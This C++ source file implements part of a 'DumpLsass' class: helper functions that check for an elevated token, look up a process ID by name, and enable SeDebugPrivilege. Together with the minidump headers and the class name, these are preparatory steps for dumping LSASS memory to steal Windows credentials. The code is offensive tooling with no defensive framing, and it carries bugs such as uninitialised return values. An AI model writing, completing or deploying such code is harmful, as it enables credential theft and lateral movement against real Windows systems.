#include "DumpLsass.h"
#pragma comment (lib, "Dbghelp.lib")
#pragma comment (lib, "Ws2_32.lib")
#pragma warning(disable : 4996)
#include <iostream>
#include "windows.h"
#include <TlHelp32.h>
#include <minidumpapiset.h>
using namespace std;

bool DumpLsass::isElevatedProcess() {
    bool isElevated;
    HANDLE access_token;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &access_token)) {
        TOKEN_ELEVATION elevation;
        DWORD token_check = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(access_token, TokenElevation, &elevation, sizeof(elevation), &token_check)) {
            isElevated = elevation.TokenIsElevated;
        }
    }
    if (access_token) {
        CloseHandle(access_token);
    }
    return isElevated;
}
DWORD DumpLsass::GetProcessIDByName(const wstring& processName) {
    DWORD processID;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 processEntry = {};
        processEntry.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(snapshot, &processEntry)) {
            do {
                wstring currentProcessName(processEntry.szExeFile);
                if (currentProcessName == processName) {
                    processID = processEntry.th32ProcessID;
                    break;
                }
            } while (Process32Next(snapshot, &processEntry));
        }
        CloseHandle(snapshot);
    }
    return processID;
}
bool DumpLsass::setPrivilege() {
    string priv_name = "SeDebugPrivilege";
    wstring privilege_name(priv_name.begin(), priv_name.end());
    const wchar_t* privName = privilege_name.c_str();
    TOKEN_PRIVILEGES priv = { 0,0,0,0 };
    HANDLE tokenPriv = NULL;
    LUID luid = { 0,0 };
    bool status = true;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &tokenPriv)) {
        status = false;
        goto EXIT;
    }
    if (!LookupPrivilegeValueW(0, privName, &luid)) {
        status = false;
        goto EXIT;
    }
    priv.PrivilegeCount = 1;
    priv.Privileges[0].Luid = luid;
    priv.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : SE_PRIVILEGE_REMOVED;

    if (!AdjustTokenPrivileges(tokenPriv, false, &priv, 0, 0, 0)) {
        status = false;
        goto EXIT;
    }
EXIT:
    if (tokenPriv) {
        CloseHandle(tokenPriv);
        return status;
    }
}